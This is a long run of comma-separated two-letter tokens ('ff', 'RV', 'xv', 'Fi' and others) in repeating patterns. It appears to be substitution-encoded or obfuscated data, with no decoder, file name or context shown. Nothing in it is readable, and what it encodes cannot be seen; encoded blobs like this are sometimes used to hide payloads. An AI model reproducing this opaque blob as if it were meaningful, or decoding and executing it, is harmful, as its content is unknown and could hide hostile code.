,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,FT,Fi,it,ff,RV,xv,NW,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,NW,yN,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,NW,ff,RV,xv,kX,kX,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,NW,xv,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,FT,Fi,it,ff,RV,xv,NW,it,ff,RV,xv,NW,Mb,ff,RV,xv,NW,NW,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,NW,xv,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,zN,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,FT,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,xv,NW,Mb,ff,RV,xv,NW,xv,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,Mb,ff,RV,xv,NW,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,zN,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,FT,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,xv,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,NW,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,NW,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,NW,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,QB,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,FT,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,FT,Fi,it,ff,RV,xv,NW,it,ff,RV,xv,NW,Mb,ff,RV,xv,NW,NW,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,yN,ff,RV,xv,NW,xv,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,FT,ff,RV,FT,Fi,QB,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,NW,FT,ff,RV,xv,NW,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,xv,kX,kX,ff,RV,xv,zN,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,FT,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,xv,kX,kX,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,xv,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,NW,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff